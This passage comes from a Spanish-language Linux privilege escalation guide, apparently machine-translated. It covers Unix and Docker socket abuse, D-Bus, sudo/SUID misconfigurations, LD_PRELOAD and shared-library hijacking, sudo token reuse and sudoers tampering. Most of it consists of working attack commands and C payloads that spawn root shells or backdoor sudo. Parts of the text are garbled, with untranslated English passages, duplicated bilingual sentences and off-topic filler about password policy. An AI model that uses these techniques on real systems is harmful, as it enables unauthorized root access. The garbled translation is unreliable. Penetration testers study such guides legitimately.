* `Service`: Especifica el nombre de la **unidad de servicio** a **activar** en el **tráfico entrante**. Esta configuración solo se permite para los sockets con Accept=no. Por defecto, es el servicio que tiene el mismo nombre que el socket (con el sufijo reemplazado). En la mayoría de los casos, no debería ser necesario usar esta opción.

### Archivos .socket modificables

Si encuentras un archivo `.socket` **modificable**, puedes **agregar** al principio de la sección `[Socket]` algo como: `ExecStartPre=/home/kali/sys/backdoor` y la puerta trasera se ejecutará antes de que se cree el socket. Por lo tanto, **probablemente tendrás que esperar hasta que la máquina se reinicie**.\
_Ten en cuenta que el sistema debe estar utilizando esa configuración de archivo de socket o la puerta trasera no se ejecutará_

### Sockets modificables

Si **identificas algún socket modificable** (_ahora estamos hablando de Sockets Unix y no de los archivos de configuración `.socket`_), entonces **puedes comunicarte** con ese socket y tal vez explotar una vulnerabilidad.

### Enumerar Sockets Unix
```bash
netstat -a -p --unix
```
### Conexión en bruto

A raw connection refers to a direct connection between two network devices without any additional protocols or encryption. This type of connection allows for low-level access to the network and can be useful for various purposes, including privilege escalation during a penetration test.

To establish a raw connection, you can use tools like netcat or socat. These tools allow you to create a socket connection and interact with the remote device using standard input and output.

Here is an example of how to establish a raw connection using netcat:

```bash
nc <target_ip> <port>
```

Replace `<target_ip>` with the IP address of the target device and `<port>` with the desired port number.

Once the connection is established, you can send and receive data directly through the socket. This can be particularly useful for exploiting vulnerabilities or performing privilege escalation techniques.

It is important to note that raw connections do not provide any encryption or authentication, making them vulnerable to interception and unauthorized access. Therefore, it is crucial to use them responsibly and only in controlled environments during authorized penetration testing activities.
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Ejemplo de explotación:**

{% content-ref url="socket-command-injection.md" %}
[socket-command-injection.md](socket-command-injection.md)
{% endcontent-ref %}

### Sockets HTTP

Ten en cuenta que puede haber algunos **sockets escuchando peticiones HTTP** (_No estoy hablando de archivos .socket sino de archivos que actúan como sockets Unix_). Puedes verificar esto con:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Si el socket responde con una solicitud HTTP, entonces puedes comunicarte con él y tal vez explotar alguna vulnerabilidad.

### Socket de Docker con permisos de escritura

El socket de Docker generalmente se encuentra en `/var/run/docker.sock` y solo es editable por el usuario `root` y el grupo `docker`.\
Si por alguna razón tienes permisos de escritura sobre ese socket, puedes escalar privilegios.\
Los siguientes comandos se pueden utilizar para escalar privilegios:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
#### Usar la API web de Docker desde el socket sin el paquete de Docker

Si tienes acceso al **socket de Docker** pero no puedes usar el binario de Docker (quizás ni siquiera está instalado), puedes utilizar la API web directamente con `curl`.

Los siguientes comandos son un ejemplo de cómo **crear un contenedor de Docker que monta la raíz** del sistema host y utiliza `socat` para ejecutar comandos en el nuevo contenedor de Docker.
```bash
# List docker images
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
#[{"Containers":-1,"Created":1588544489,"Id":"sha256:<ImageID>",...}]
# Send JSON to docker API to create the container
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
#{"Id":"<NewContainerID>","Warnings":[]}
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```
El último paso es utilizar `socat` para iniciar una conexión con el contenedor, enviando una solicitud de "attach".
```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp

#HTTP/1.1 101 UPGRADED
#Content-Type: application/vnd.docker.raw-stream
#Connection: Upgrade
#Upgrade: tcp
```
Ahora puedes ejecutar comandos en el contenedor desde esta conexión `socat`.

### Otros

Ten en cuenta que si tienes permisos de escritura sobre el socket de Docker porque estás **dentro del grupo `docker`**, tienes [**más formas de escalar privilegios**](interesting-groups-linux-pe/#docker-group). Si la [**API de Docker está escuchando en un puerto**, también puedes comprometerla](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Consulta **más formas de escapar de Docker o abusar de él para escalar privilegios** en:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Escalada de privilegios en Containerd (ctr)

Si descubres que puedes usar el comando **`ctr`**, lee la siguiente página, ya que **es posible que puedas abusar de él para escalar privilegios**:

{% content-ref url="containerd-ctr-privilege-escalation.md" %}
[containerd-ctr-privilege-escalation.md](containerd-ctr-privilege-escalation.md)
{% endcontent-ref %}

## Escalada de privilegios en **RunC**

Si descubres que puedes usar el comando **`runc`**, lee la siguiente página, ya que **es posible que puedas abusar de él para escalar privilegios**:

{% content-ref url="runc-privilege-escalation.md" %}
[runc-privilege-escalation.md](runc-privilege-escalation.md)
{% endcontent-ref %}

## **D-Bus**

D-BUS es un **sistema de comunicación interproceso (IPC)** que proporciona un mecanismo simple pero potente **que permite que las aplicaciones se comuniquen entre sí**, intercambien información y soliciten servicios. D-BUS fue diseñado desde cero para satisfacer las necesidades de un sistema Linux moderno.

Como un sistema IPC y de objetos completo, D-BUS tiene varios usos previstos. En primer lugar, D-BUS puede realizar IPC básico entre aplicaciones, permitiendo que un proceso envíe datos a otro, como **sockets de dominio UNIX mejorados**. En segundo lugar, D-BUS puede facilitar el envío de eventos o señales a través del sistema, permitiendo que los diferentes componentes del sistema se comuniquen e integren mejor. Por ejemplo, un demonio de Bluetooth puede enviar una señal de llamada entrante que tu reproductor de música puede interceptar, silenciando el volumen hasta que termine la llamada. Por último, D-BUS implementa un sistema de objetos remotos, que permite que una aplicación solicite servicios e invoque métodos desde un objeto diferente, como CORBA pero sin las complicaciones. (De [aquí](https://www.linuxjournal.com/article/7744)).

D-Bus utiliza un modelo de **permisos permitir/denegar**, donde cada mensaje (llamada de método, emisión de señal, etc.) puede ser **permitido o denegado** según la suma de todas las reglas de política que lo coincidan. Cada regla en la política debe tener el atributo `own`, `send_destination` o `receive_sender` establecido.

Parte de la política de `/etc/dbus-1/system.d/wpa_supplicant.conf`:
```markup
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
Por lo tanto, si una política permite a tu usuario **interactuar con el bus** de alguna manera, podrías aprovecharlo para escalar privilegios (tal vez solo para listar algunas contraseñas?).

Ten en cuenta que una **política** que **no especifica** ningún usuario o grupo afecta a todos (`<policy>`).\
Las políticas en el contexto "default" afectan a todos los que no están afectados por otras políticas (`<policy context="default"`).

**Aprende cómo enumerar y explotar una comunicación D-Bus aquí:**

{% content-ref url="d-bus-enumeration-and-command-injection-privilege-escalation.md" %}
[d-bus-enumeration-and-command-injection-privilege-escalation.md](d-bus-enumeration-and-command-injection-privilege-escalation.md)
{% endcontent-ref %}

## **Red**

Siempre es interesante enumerar la red y averiguar la posición de la máquina.

### Enumeración genérica
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Puertos abiertos

Siempre verifica los servicios de red que se están ejecutando en la máquina con la que no pudiste interactuar antes de acceder a ella:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing (Espionaje)

Verifica si puedes espiar el tráfico. Si puedes, podrías ser capaz de obtener algunas credenciales.
```
timeout 1 tcpdump
```
## Usuarios

### Enumeración genérica

Verifica **quién** eres, qué **privilegios** tienes, qué **usuarios** hay en el sistema, cuáles pueden **iniciar sesión** y cuáles tienen **privilegios de root**:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Algunas versiones de Linux se vieron afectadas por un error que permite a los usuarios con **UID > INT\_MAX** escalar privilegios. Más información: [aquí](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [aquí](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) y [aquí](https://twitter.com/paragonsec/status/1071152249529884674).\
**Explotarlo** usando: **`systemd-run -t /bin/bash`**

### Grupos

Verifique si es **miembro de algún grupo** que pueda otorgarle privilegios de root:

{% content-ref url="interesting-groups-linux-pe/" %}
[interesting-groups-linux-pe](interesting-groups-linux-pe/)
{% endcontent-ref %}

### Portapapeles

Verifique si hay algo interesante dentro del portapapeles (si es posible)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Política de Contraseñas

A strong password policy is essential for maintaining the security of a system. It helps prevent unauthorized access and protects sensitive information. Here are some key points to consider when implementing a password policy:

- **Password Length**: Require passwords to be a minimum length, typically at least 8 characters. Longer passwords are generally more secure.
- **Complexity**: Encourage the use of complex passwords that include a combination of uppercase and lowercase letters, numbers, and special characters.
- **Password Expiration**: Set a policy that requires users to change their passwords periodically, such as every 90 days. This helps prevent the use of compromised passwords.
- **Password History**: Implement a password history feature that prevents users from reusing their previous passwords. This ensures that users choose new and unique passwords each time.
- **Account Lockout**: Implement an account lockout policy that temporarily locks user accounts after a certain number of failed login attempts. This helps protect against brute-force attacks.
- **Two-Factor Authentication**: Consider implementing two-factor authentication (2FA) to provide an additional layer of security. This requires users to provide a second form of verification, such as a code sent to their mobile device, in addition to their password.

By implementing a strong password policy, you can significantly enhance the security of your system and reduce the risk of unauthorized access.
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Contraseñas conocidas

Si **conoces alguna contraseña** del entorno, intenta iniciar sesión como cada usuario utilizando la contraseña.

### Su Brute

Si no te importa hacer mucho ruido y los binarios `su` y `timeout` están presentes en la computadora, puedes intentar forzar el acceso de usuarios utilizando [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) con el parámetro `-a` también intenta forzar el acceso de usuarios.

## Abusos de PATH con permisos de escritura

### $PATH

Si descubres que puedes **escribir dentro de alguna carpeta del $PATH**, es posible que puedas elevar los privilegios creando una puerta trasera dentro de la carpeta con permisos de escritura, con el nombre de algún comando que será ejecutado por un usuario diferente (idealmente root) y que **no se cargue desde una carpeta que se encuentre antes** de tu carpeta con permisos de escritura en $PATH.

### SUDO y SUID

Es posible que se te permita ejecutar algún comando utilizando sudo o que tengan el bit suid. Verifícalo utilizando:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Algunos **comandos inesperados te permiten leer y/o escribir archivos e incluso ejecutar un comando**. Por ejemplo:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

La configuración de Sudo podría permitir a un usuario ejecutar algún comando con los privilegios de otro usuario sin necesidad de conocer la contraseña.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
En este ejemplo, el usuario `demo` puede ejecutar `vim` como `root`, ahora es trivial obtener una shell agregando una clave ssh en el directorio raíz o llamando a `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Esta directiva permite al usuario **establecer una variable de entorno** mientras ejecuta algo:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Este ejemplo, **basado en la máquina HTB Admirer**, era **vulnerable** a **PYTHONPATH hijacking** para cargar una biblioteca de Python arbitraria mientras se ejecuta el script como root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Bypass de ejecución de Sudo omitiendo rutas

**Salta** para leer otros archivos o utiliza **enlaces simbólicos**. Por ejemplo, en el archivo sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Si se utiliza un **comodín** (\*), es aún más fácil:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Contramedidas**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Comando Sudo/binario SUID sin ruta de comando

Si se otorga el **permiso sudo** a un solo comando **sin especificar la ruta**: _hacker10 ALL= (root) less_, puedes explotarlo cambiando la variable PATH.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Esta técnica también se puede utilizar si un binario **suid** ejecuta otro comando sin especificar la ruta hacia él (siempre verificar con **strings** el contenido de un binario **suid** sospechoso).

[Ejemplos de carga útil para ejecutar.](payloads-to-execute.md)

### Binario **suid** con ruta de comando

Si el binario **suid** ejecuta otro comando especificando la ruta, entonces puedes intentar **exportar una función** con el mismo nombre que el comando que el archivo **suid** está llamando.

Por ejemplo, si un binario **suid** llama a _**/usr/sbin/service apache2 start**_, debes intentar crear la función y exportarla:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Entonces, cuando llamas al binario suid, esta función se ejecutará.

### LD\_PRELOAD y **LD\_LIBRARY\_PATH**

**LD\_PRELOAD** es una variable de entorno opcional que contiene una o más rutas a bibliotecas compartidas, u objetos compartidos, que el cargador cargará antes que cualquier otra biblioteca compartida, incluida la biblioteca de tiempo de ejecución de C (libc.so). Esto se llama precargar una biblioteca.

Para evitar que este mecanismo se utilice como un vector de ataque para binarios ejecutables _suid/sgid_, el cargador ignora _LD\_PRELOAD_ si _ruid != euid_. Para dichos binarios, solo se precargarán bibliotecas en rutas estándar que también sean _suid/sgid_.

Si encuentras dentro de la salida de **`sudo -l`** la frase: _**env\_keep+=LD\_PRELOAD**_ y puedes llamar a algún comando con sudo, puedes escalar privilegios.
```
Defaults        env_keep += LD_PRELOAD
```
Guardar como **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Luego **compílalo** usando:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Finalmente, **elevar privilegios** ejecutando
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
{% hint style="danger" %}
Un atacante puede abusar de una vulnerabilidad similar de escalada de privilegios si controla la variable de entorno **LD\_LIBRARY\_PATH**, ya que puede controlar la ruta donde se buscarán las bibliotecas.
{% endhint %}
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### Binario SUID - Inyección de .so

Si encuentras un binario extraño con permisos **SUID**, puedes verificar si todos los archivos **.so** se están **cargando correctamente**. Para hacerlo, puedes ejecutar:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Por ejemplo, si encuentras algo como: _pen(“/home/user/.config/libcalc.so”, O\_RDONLY) = -1 ENOENT (No existe el archivo o directorio)_ puedes explotarlo.

Crea el archivo _/home/user/.config/libcalc.c_ con el código:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Compílalo usando:
```bash
gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
```
## Secuestro de Objetos Compartidos

Shared Object Hijacking, also known as DLL hijacking, is a privilege escalation technique that allows an attacker to execute arbitrary code with elevated privileges by exploiting the way an application loads shared libraries.

El Secuestro de Objetos Compartidos, también conocido como DLL hijacking, es una técnica de escalada de privilegios que permite a un atacante ejecutar código arbitrario con privilegios elevados al explotar la forma en que una aplicación carga bibliotecas compartidas.

### How it works

### Cómo funciona

When an application is designed to load a shared library, it usually searches for the library in a specific order. If the library is not found in the expected location, the application may search in other directories or use a default library with the same name.

Cuando una aplicación está diseñada para cargar una biblioteca compartida, generalmente busca la biblioteca en un orden específico. Si la biblioteca no se encuentra en la ubicación esperada, la aplicación puede buscar en otros directorios o utilizar una biblioteca predeterminada con el mismo nombre.

An attacker can take advantage of this behavior by placing a malicious shared library with the same name as the expected library in a directory that is searched before the legitimate one. When the application attempts to load the library, it will unknowingly load the attacker's library instead, allowing the attacker to execute arbitrary code with the privileges of the application.

Un atacante puede aprovechar este comportamiento colocando una biblioteca compartida maliciosa con el mismo nombre que la biblioteca esperada en un directorio que se busca antes que el legítimo. Cuando la aplicación intenta cargar la biblioteca, cargará sin saberlo la biblioteca del atacante en su lugar, lo que permite al atacante ejecutar código arbitrario con los privilegios de la aplicación.

### Mitigation

### Mitigación

To mitigate shared object hijacking attacks, it is recommended to follow these best practices:

Para mitigar los ataques de secuestro de objetos compartidos, se recomienda seguir estas mejores prácticas:

- Use absolute paths when loading shared libraries to ensure that the correct library is loaded.

- Utilice rutas absolutas al cargar bibliotecas compartidas para asegurarse de que se cargue la biblioteca correcta.

- Avoid using default library names, as they are more likely to be targeted by attackers.

- Evite utilizar nombres de bibliotecas predeterminados, ya que es más probable que sean objetivo de los atacantes.

- Regularly update the application and its dependencies to ensure that any known vulnerabilities are patched.

- Actualice regularmente la aplicación y sus dependencias para asegurarse de que se corrijan las vulnerabilidades conocidas.

- Implement strong access controls and privilege separation to limit the impact of a successful attack.

- Implemente controles de acceso sólidos y separación de privilegios para limitar el impacto de un ataque exitoso.

By following these measures, the risk of shared object hijacking can be significantly reduced.

Al seguir estas medidas, se puede reducir significativamente el riesgo de secuestro de objetos compartidos.
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Ahora que hemos encontrado un binario SUID que carga una biblioteca desde una carpeta en la que podemos escribir, creemos la biblioteca en esa carpeta con el nombre necesario:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Si recibes un error como el siguiente:
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
Esto significa que la biblioteca que has generado debe tener una función llamada `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) es una lista seleccionada de binarios de Unix que pueden ser explotados por un atacante para evadir restricciones de seguridad locales. [**GTFOArgs**](https://gtfoargs.github.io/) es lo mismo pero para casos en los que solo puedes inyectar argumentos en un comando.

El proyecto recopila funciones legítimas de binarios de Unix que pueden ser abusadas para escapar de shells restringidas, elevar o mantener privilegios elevados, transferir archivos, generar shells de enlace y reversa, y facilitar otras tareas de post-explotación.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{% embed url="https://gtfobins.github.io/" %}

{% embed url="https://gtfoargs.github.io/" %}

### FallOfSudo

Si puedes acceder a `sudo -l`, puedes usar la herramienta [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) para verificar si encuentra alguna regla de sudo que se pueda explotar.

### Reutilización de Tokens de Sudo

En el escenario en el que **tienes una shell como usuario con privilegios de sudo** pero no conoces la contraseña del usuario, puedes **esperar a que él/ella ejecute algún comando usando `sudo`**. Luego, puedes **acceder al token de la sesión donde se usó sudo y usarlo para ejecutar cualquier cosa como sudo** (escalada de privilegios).

Requisitos para escalar privilegios:

* Ya tienes una shell como usuario "_sampleuser_"
* "_sampleuser_" ha **usado `sudo`** para ejecutar algo en los **últimos 15 minutos** (por defecto, esa es la duración del token de sudo que nos permite usar `sudo` sin introducir ninguna contraseña)
* `cat /proc/sys/kernel/yama/ptrace_scope` es 0
* `gdb` es accesible (puedes subirlo)

(Puedes habilitar temporalmente `ptrace_scope` con `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` o modificar permanentemente `/etc/sysctl.d/10-ptrace.conf` y establecer `kernel.yama.ptrace_scope = 0`)

Si se cumplen todos estos requisitos, **puedes escalar privilegios usando:** [**https://github.com/nongiach/sudo\_inject**](https://github.com/nongiach/sudo\_inject)

* La **primera explotación** (`exploit.sh`) creará el binario `activate_sudo_token` en _/tmp_. Puedes usarlo para **activar el token de sudo en tu sesión** (no obtendrás automáticamente una shell de root, haz `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
* El **segundo exploit** (`exploit_v2.sh`) creará una shell sh en _/tmp_ **propiedad de root con setuid**.
```bash
bash exploit_v2.sh
/tmp/sh -p
```
*El **tercer exploit** (`exploit_v3.sh`) **creará un archivo sudoers** que hace que los tokens de sudo sean eternos y permite que todos los usuarios utilicen sudo.*
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Nombre de usuario>

Si tienes **permisos de escritura** en la carpeta o en cualquiera de los archivos creados dentro de la carpeta, puedes usar el binario [**write\_sudo\_token**](https://github.com/nongiach/sudo\_inject/tree/master/extra\_tools) para **crear un token sudo para un usuario y PID**.\
Por ejemplo, si puedes sobrescribir el archivo _/var/run/sudo/ts/sampleuser_ y tienes una shell como ese usuario con PID 1234, puedes **obtener privilegios de sudo** sin necesidad de conocer la contraseña haciendo:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

El archivo `/etc/sudoers` y los archivos dentro de `/etc/sudoers.d` configuran quién puede usar `sudo` y cómo. Estos archivos, por defecto, solo pueden ser leídos por el usuario root y el grupo root.\
Si puedes leer este archivo, podrías obtener información interesante, y si puedes escribir en cualquier archivo, podrás elevar tus privilegios.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Si puedes escribir, puedes abusar de este permiso.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Otra forma de abusar de estos permisos:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Existen algunas alternativas al binario `sudo`, como `doas` para OpenBSD. Recuerda verificar su configuración en `/etc/doas.conf`.
```
permit nopass demo as root cmd vim
```
### Secuestro de Sudo

Si sabes que un **usuario suele conectarse a una máquina y utiliza `sudo`** para elevar los privilegios y tienes una shell dentro del contexto de ese usuario, puedes **crear un nuevo ejecutable de sudo** que ejecutará tu código como root y luego el comando del usuario. Luego, **modifica el $PATH** del contexto del usuario (por ejemplo, agregando la nueva ruta en .bash\_profile) para que cuando el usuario ejecute sudo, se ejecute tu ejecutable de sudo.

Ten en cuenta que si el usuario utiliza un shell diferente (no bash), deberás modificar otros archivos para agregar la nueva ruta. Por ejemplo, [sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifica `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Puedes encontrar otro ejemplo en [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire\_modules/bashdoor.py)

O ejecutando algo como:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Biblioteca compartida

### ld.so

El archivo `/etc/ld.so.conf` indica **de dónde se cargan los archivos de configuración**. Normalmente, este archivo contiene la siguiente ruta: `include /etc/ld.so.conf.d/*.conf`

Esto significa que se leerán los archivos de configuración de `/etc/ld.so.conf.d/*.conf`. Estos archivos de configuración **apuntan a otras carpetas** donde se buscarán las **bibliotecas**. Por ejemplo, el contenido de `/etc/ld.so.conf.d/libc.conf` es `/usr/local/lib`. **Esto significa que el sistema buscará bibliotecas dentro de `/usr/local/lib`**.

Si por alguna razón **un usuario tiene permisos de escritura** en alguna de las rutas indicadas: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, cualquier archivo dentro de `/etc/ld.so.conf.d/` o cualquier carpeta dentro del archivo de configuración dentro de `/etc/ld.so.conf.d/*.conf`, es posible que pueda escalar privilegios.\
Echa un vistazo a **cómo explotar esta mala configuración** en la siguiente página:

{% content-ref url="ld.so.conf-example.md" %}
[ld.so.conf-example.md](ld.so.conf-example.md)
{% endcontent-ref %}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Al copiar la librería en `/var/tmp/flag15/`, será utilizada por el programa en este lugar como se especifica en la variable `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
A continuación, crea una biblioteca maliciosa en `/var/tmp` con `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capacidades

Las capacidades de Linux proporcionan un **subconjunto de los privilegios de root disponibles a un proceso**. Esto divide efectivamente los privilegios de root en unidades más pequeñas y distintivas. Cada una de estas unidades puede ser otorgada de forma independiente a los procesos. De esta manera, se reduce el conjunto completo de privilegios, disminuyendo los riesgos de explotación.\
Lee la siguiente página para **obtener más información sobre las capacidades y cómo abusar de ellas**:

{% content-ref url="linux-capabilities.md" %}
[linux-capabilities.md](linux-capabilities.md)
{% endcontent-ref %}

## Permisos de directorio

En un directorio, el **bit "ejecutar"** implica que el usuario afectado puede "**cd**" en la carpeta.\
El bit **"leer"** implica que el usuario puede **listar** los **archivos**, y el bit **"escribir"** implica que el usuario puede **eliminar** y **crear** nuevos **archivos**.

## ACLs

Las ACLs (Listas de Control de Acceso) son el segundo nivel de permisos discrecionales, que **pueden anular los permisos estándar ugo/rwx**. Cuando se utilizan correctamente, pueden otorgar una **mayor granularidad en el establecimiento de acceso a un archivo o directorio**, por ejemplo, al dar o denegar acceso a un usuario específico que no es el propietario del archivo ni el propietario del grupo (de [**aquí**](https://linuxconfig.org/how-to-manage-acls-on-linux)).\
**Otorga** al usuario "kali" permisos de lectura y escritura sobre un archivo:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Obtener** archivos con ACL específicas del sistema:

```bash
getfacl -R /path/to/directory
```

Este comando permite obtener los archivos con ACL (Listas de Control de Acceso) específicas del sistema. El parámetro `-R` indica que se debe realizar una búsqueda recursiva en el directorio especificado (`/path/to/directory`).
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Sesiones de shell abiertas

